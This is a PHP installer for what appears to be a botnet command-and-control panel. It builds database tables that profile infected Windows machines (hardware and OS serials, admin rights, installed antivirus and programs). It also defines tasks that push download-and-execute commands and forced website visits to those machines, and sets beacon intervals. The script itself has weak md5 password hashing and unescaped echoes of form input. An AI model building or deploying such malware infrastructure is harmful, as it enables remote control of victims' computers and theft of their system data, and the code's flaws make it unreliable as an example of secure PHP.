<?php
    set_time_limit(10 * 60); // 10 mins
    include_once("gdx/utility.php");
    
    function ImportCSV($conn)
    {
        $File = fopen("geoip.csv", "r");
        if (is_resource($File)) 
        {
            $conn->beginTransaction();
            $q = $conn->prepare("INSERT INTO GeoIP (addr_type, ip_start, ip_end, country) VALUES (:addr_type, :start, :end, :country)");
            while ($r = fgetcsv($File))
            {
                $addr_type = AddrType($r[0]);
                $start = inet_pton($r[0]);
                $end = inet_pton($r[1]);
                $country = $r[2];
                
                $q->execute(array(':addr_type' => $addr_type, ':start' => $start, ':end' => $end, ':country' => $country));
            }
            
            $conn->commit();
            fclose($File);
            return true;
        }

        return false;
    }

    function Install(&$pResult, $MySQLHost, $MySQLUser, $MySQLPw, $DBName, $User, $UserPw, $Key1, $Key2)
    {
        $Result = "";
        $Ret = false;
        
        try 
        {
            $Result .= "Connecting...<br/>";
            $conn = new PDO("mysql:host=$MySQLHost;dbname=$DBName", $MySQLUser, $MySQLPw);
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            $Result .= "Selecting database<br/>";
            $conn->exec("USE {$DBName}");
            
            $Result .= "Creating table (Clients)<br/>";
            $sql = "CREATE TABLE IF NOT EXISTS Clients (
                        id INT UNSIGNED NOT NULL AUTO_INCREMENT , 
                        Status TINYINT UNSIGNED NOT NULL , 
                        ClientId BINARY(16) NOT NULL , 
                        Version INT NOT NULL , 
                        GroupName CHAR(32) NOT NULL , 
                        IPAddress VARBINARY(16) NOT NULL , 
                        Location VARCHAR(2) NOT NULL , 
                        HasAdminRigths TINYINT UNSIGNED NOT NULL , 
                        FilePath VARBINARY(1024) NOT NULL , 
                        InstallationDate INT NOT NULL , 
                        LastCheck INT NOT NULL , 
                        Killed INT NOT NULL , 
                        OperatingSystem INT UNSIGNED NOT NULL , 
                        OSArchitecture TINYINT UNSIGNED NOT NULL , 
                        ServipackVersion SMALLINT UNSIGNED NOT NULL , 
                        WindowsEdition SMALLINT UNSIGNED NOT NULL , 
                        WindowsBuildId SMALLINT UNSIGNED NOT NULL , 
                        WindowsLang SMALLINT UNSIGNED NOT NULL , 
                        WindowsSerial VARBINARY(255) NOT NULL , 
                        WindowsDir VARBINARY(255) NOT NULL , 
                        PCName VARBINARY(32) NOT NULL , 
                        UserName VARBINARY(514) NOT NULL , 
                        PCLocalTime INT NOT NULL , 
                        ComputerModel VARBINARY(255) NOT NULL , 
                        ComputerType INT UNSIGNED NOT NULL , 
                        BIOSName VARBINARY(255) NOT NULL , 
                        BIOSManufacturer VARBINARY(255) NOT NULL , 
                        BIOSVersion VARBINARY(255) NOT NULL , 
                        BIOSSerialNumber VARBINARY(255) NOT NULL , 
                        CPUName VARBINARY(255) NOT NULL , 
                        CPUManufacturer VARBINARY(255) NOT NULL , 
                        CPUArquitecture INT UNSIGNED NOT NULL , 
                        CPUNumberProcessors SMALLINT UNSIGNED NOT NULL , 
                        VideoAdapter VARBINARY(255) NOT NULL , 
                        VideoResolution VARBINARY(255) NOT NULL , 
                        VideoRefreshRate INT NOT NULL , 
                        HardDrives VARBINARY(1024) NOT NULL , 
                        PhysicalMemories VARBINARY(1024) NOT NULL , 
                        DefaultBrowser VARBINARY(1024) NOT NULL , 
                        InstalledBrowsers VARBINARY(4096) NOT NULL , 
                        InstalledNETFrameworks VARBINARY(4096) NOT NULL , 
                        InstalledPrograms VARBINARY(10240) NOT NULL , 
                        JAVAVM VARBINARY(1024) NOT NULL , 
                        Antivirus VARBINARY(1024) NOT NULL , 
                        ClientFlags INT NOT NULL , 
                        FuncFlags INT NOT NULL ,
                        Comments TEXT NOT NULL ,
                        PRIMARY KEY ( Id )
                        );";
            
            $conn->exec($sql);
            
            $Result .= "Creating table (Tasks)<br/>";
            $sql =   "CREATE TABLE IF NOT EXISTS Tasks (
                            Id INT UNSIGNED NOT NULL AUTO_INCREMENT ,
                            TaskId BINARY(16) NOT NULL ,
                            TaskName TEXT NOT NULL ,
                            TaskType TINYINT UNSIGNED NOT NULL ,
                            TaskParameter TEXT NOT NULL ,
                            ClientsFilter TEXT NOT NULL ,
                            LocationsFilter TEXT NOT NULL ,
                            OperatingSystemsFilter INT UNSIGNED NOT NULL ,
                            TasksSent INT UNSIGNED NOT NULL ,
                            ClientsExecuted INT UNSIGNED NOT NULL ,
                            ClientsFailed INT UNSIGNED NOT NULL ,
                            MaximumClients INT UNSIGNED NOT NULL ,
                            CreationDate INT NOT NULL ,
                            ExpirationDate INT NOT NULL ,
                            Status TINYINT UNSIGNED NOT NULL ,
                            PRIMARY KEY ( Id )
                            );
                        ";
                        
            $conn->exec($sql);
            
            $Result .= "Creating table (TasksCompleted)<br/>";
            $sql =   "CREATE TABLE IF NOT EXISTS TasksCompleted (
                        Id INT UNSIGNED NOT NULL AUTO_INCREMENT ,
                        TaskId BINARY(16) NOT NULL ,
                        ClientId BINARY(16) NOT NULL ,
                        CompletionDate INT NOT NULL ,
                        ReturnCode INT NOT NULL , 
                        Status TINYINT UNSIGNED NOT NULL ,
                        PRIMARY KEY ( Id )
                        );
                    ";
                    
            $conn->exec($sql);
            
            $Result .= "Creating table (Settings)<br/>";
            $sql =   "CREATE TABLE IF NOT EXISTS Settings (
                        PanelVersion INT UNSIGNED NOT NULL ,
                        KnockInterval INT UNSIGNED NOT NULL ,
                        DeadInterval INT UNSIGNED NOT NULL , 
                        Key1 BINARY(16) NOT NULL , 
                        Key2 BINARY(16) NOT NULL , 
                        MaxLoginTries INT UNSIGNED NOT NULL
                        );";
                        
            $conn->exec($sql);
            
            $Result .= "Creating table (Notifications)<br/>";
            $sql =   "CREATE TABLE IF NOT EXISTS Notifications (
                        Id INT UNSIGNED NOT NULL AUTO_INCREMENT ,
                        Type INT UNSIGNED NOT NULL , 
                        Information TEXT NOT NULL ,
                        DateTime INT UNSIGNED NOT NULL ,
                        PRIMARY KEY ( Id )
                        );";
                        
            $conn->exec($sql);
            
            $Result .= "Creating table (LoginTries)<br/>";
            $sql =   "CREATE TABLE IF NOT EXISTS LoginTries (
                        Id INT UNSIGNED NOT NULL AUTO_INCREMENT ,
                        IPAddress VARBINARY(16) NOT NULL , 
                        DateTime INT UNSIGNED NOT NULL ,
                        PRIMARY KEY ( Id )
                        );";
                        
            $conn->exec($sql);
            
            $Result .= "Creating table (Admins)<br/>";
            $sql =   "CREATE TABLE IF NOT EXISTS Admins (
                        Id INT UNSIGNED NOT NULL AUTO_INCREMENT,
                        UserName CHAR(255) NOT NULL ,
                        PasswordHash CHAR(255) NOT NULL ,
                        LastLogin INT UNSIGNED NOT NULL ,
                        Privileges INT UNSIGNED NOT NULL ,
                        PRIMARY KEY ( Id )
                        );";
                        
            $conn->exec($sql);
            
            $Result .= "Creating table (GeoIP)<br/>";
            $sql = "CREATE TABLE IF NOT EXISTS GeoIP (
                        addr_type enum('ipv4', 'ipv6') NOT NULL,
                        ip_start varbinary(16) NOT NULL ,
                        ip_end varbinary(16) NOT NULL ,
                        country char(2) NOT NULL ,
                        PRIMARY KEY (ip_start)
                        );";
                        
            $conn->exec($sql);
            
            $Result .= "Default values...<br/>";
            
            $Hash = md5($UserPw);
            $pr = $conn->prepare("INSERT INTO Admins (UserName, PasswordHash) VALUES (:User, :Hash)");
            $pr->execute(array("User" => $User, "Hash" => $Hash));
            
            $Key1Bin = pack("H*", $Key1);
            $Key2Bin = pack("H*", $Key2);
            
            $pr = $conn->prepare("INSERT INTO Settings (KnockInterval, DeadInterval, Key1, Key2) VALUES (:Knock, :Dead, :Key1, :Key2)");
            $pr->execute(array("Knock" => 5, "Dead" => 15, "Key1" => $Key1Bin, "Key2" => $Key2Bin));
            
            $Internal = "<?php
define(\"CLIENTS_TABLE\", \"Clients\");
define(\"TASKS_TABLE\", \"Tasks\");
define(\"SETTINGS_TABLE\", \"Settings\");

define(\"MYSQL_HOST\", \"{$MySQLHost}\");
define(\"MYSQL_USER\", \"{$MySQLUser}\");
define(\"MYSQL_PASSWORD\", \"{$MySQLPw}\");
define(\"DATABASE_NAME\", \"{$DBName}\");

// Windows version

define(\"WINDOWS_XP_SZ\", \"Windows XP\");
define(\"WINDOWS_2003_SZ\", \"Windows 2003\");
define(\"WINDOWS_VISTA_SZ\", \"Windows Vista\");
define(\"WINDOWS_7_SZ\", \"Windows 7\");
define(\"WINDOWS_8_SZ\", \"Windows 8\");
define(\"WINDOWS_8_1_SZ\", \"Windows 8.1\");
define(\"WINDOWS_10_SZ\", \"Windows 10\");
define(\"ALL_OPERATING_SYSTEMS_SZ\", \"All Operating systems\");

define(\"WINDOWS_XP\", 501);
define(\"WINDOWS_2003\", 502);
define(\"WINDOWS_VISTA\", 600);
define(\"WINDOWS_7\", 601);
define(\"WINDOWS_8\", 602);
define(\"WINDOWS_8_1\", 603);
define(\"WINDOWS_10\", 1000);

// Task operating systems filter

define(\"WINDOWS_XP_MASK\", 0x00000001);
define(\"WINDOWS_2003_MASK\", 0x00000002);
define(\"WINDOWS_VISTA_MASK\", 0x00000004);
define(\"WINDOWS_7_MASK\", 0x00000008);
define(\"WINDOWS_8_MASK\", 0x00000010);
define(\"WINDOWS_8_1_MASK\", 0x00000020);
define(\"WINDOWS_10_MASK\", 0x000000040);
define(\"ALL_OPERATING_SYSTEMS_MASK\", 0x00008000);

define(\"KEY_SIZE\", 16);

// Task status

define(\"TASK_EXECUTING\", 1);
define(\"TASK_FINISHED\", 2);
define(\"TASK_EXPIRED\", 3);
define(\"TASK_SUSPENDED\", 4);


// Task status (completed)

define(\"TASK_CMPLD_SENT\", 1);
define(\"TASK_CMPLD_EXECUTED\", 2);
define(\"TASK_CMPLD_FAILED\", 3);

// Task type integer

define(\"TASK_DOWNLOAD_AND_EXECUTE\", 1);
define(\"TASK_VISIT_WEBSITE\", 2);
define(\"TASK_UPDATE_CLIENT\", 3);
define(\"TASK_UNINSTALL_CLIENT\", 4);

// Request header

define(\"HEADER_CLIENT_NOTIFY\", \"CLNT\");
define(\"HEADER_EXECUTE_TASK\", \"EXTK\");
define(\"HEADER_TASK_RESULT\", \"TKRS\");
define(\"HEADER_CLIENT_COMPLETED\", \"CLCP\");

?>";
            $Result .= "Creating internal file<br/>";
            
            chmod("gdx", 0777);
            $File = fopen("gdx/internal.php", "w");
            if($File)
            {
                fwrite($File, $Internal);
                fclose($File);
                
            }else throw new Exception("Unable to create the file<br/>");
            chmod("gdx", 0755);
            
            $Result .= "Importing Geo IP<br/>";
            ImportCSV($conn);
            
            $Result .= "Installed successfully, delete setup.php<br/>";
            $Ret = true;
            $conn = null;
            
        } catch(Exception $e) {
            $conn = null;
            $Result .= $e->getMessage();
        }
        
        $pResult = $Result;
        
        return $Ret;
    }
    
    /////////////////////////////////////////////////////////////////////////////////////////////////////

    if(isset($_POST["setup_submit"]))
    {
        $ret = false;
        $result = "";
        
        if(!(isset($_POST["mysql_host"]) && strlen($_POST["mysql_host"]) > 0))
        {
            $result = "Host is required";
        }
        else if(!(isset($_POST["mysql_user"]) && strlen($_POST["mysql_user"]) > 0))
        {
            $result = "User is required";
        }
        else if(!(isset($_POST["database_name"]) && strlen($_POST["database_name"]) > 0))
        {
            $result = "Database is required";
        }
        else if(!(isset($_POST["username"]) && strlen($_POST["username"]) > 0))
        {
            $result = "Username is required";
        }
        else if(!(isset($_POST["user_password"]) && strlen($_POST["user_password"]) > 0))
        {
            $result = "Password is required";
        }
        else
        {
            $ret = Install(
                $result,
                $_POST["mysql_host"],
                $_POST["mysql_user"],
                $_POST["mysql_password"],
                $_POST["database_name"],
                $_POST["username"],
                $_POST["user_password"],
                $_POST["key1"],
                $_POST["key2"]
                );
        }
    }
    
    /////////////////////////////////////////////////////////////////////////////////////////////////////
?>

<head>
    <link href="css/style.css" rel="stylesheet" type="text/css"/>
</head>
<html>
    <h2 align="center"> Setup information </h1>
    <br/>
    
    <!-- checking error or success -->
    <?php 
        if (isset($ret) && isset($result) && strlen($result))
        {
            if($ret == true) $clr = "green"; else $clr = "red";
            echo "<div style='width: 100%; text-align: center; color: {$clr}' >{$result}</div><br/>";
        }
    ?>
    
    <form action='' method='post'>
        <div align='center'>
            SQL Host: <br/> 
            <input style='width:300px' type='text' name='mysql_host' autocomplete:'off'
            value='<?php echo (isset($_POST["mysql_host"])) ? $_POST["mysql_host"] : "" ?>'/> <br/> <br/>
            
            SQL User: <br/> 
            <input style='width:300px' type='text' name='mysql_user' autocomplete:'off'
            value='<?php echo (isset($_POST["mysql_user"])) ? $_POST["mysql_user"] : "" ?>'/> <br/> <br/>
            
            SQL Password: <br/>
            <input style='width:300px' type='password' name='mysql_password' value=''/> <br/> <br/>
            
            Database name: <br/>
            <input style='width:300px' type='text' name='database_name' autocomplete:'off'
            value='<?php echo (isset($_POST["database_name"])) ? $_POST["database_name"] : "" ?>'/> <br/> <br/>
            
            Username (Control panel): <br/>
            <input style='width:300px' type='text' name='username' autocomplete:'off'
            value='<?php echo (isset($_POST["username"])) ? $_POST["username"] : "" ?>'/> <br/> <br/>
            
            Password (Control panel): <br/>
            <input style='width:300px' type='text' name='user_password' value=''/> <br/><br/>
            
            Key #1: <br/>
            <input style='width:300px' type='text' name='key1' autocomplete:'off'
            value='<?php echo (isset($_POST["key1"])) ? $_POST["key1"] : "" ?>'/> <br/> <br/>
            
            Key #2: <br/>
            <input style='width:300px' type='text' name='key2' autocomplete:'off'
            value='<?php echo (isset($_POST["key2"])) ? $_POST["key2"] : "" ?>'/> <br/> <br/>
            
            <br/>
            <input style='width:300px' type='submit' name='setup_submit' value='Install' action=''/>
        </div>
    </form>
</html>
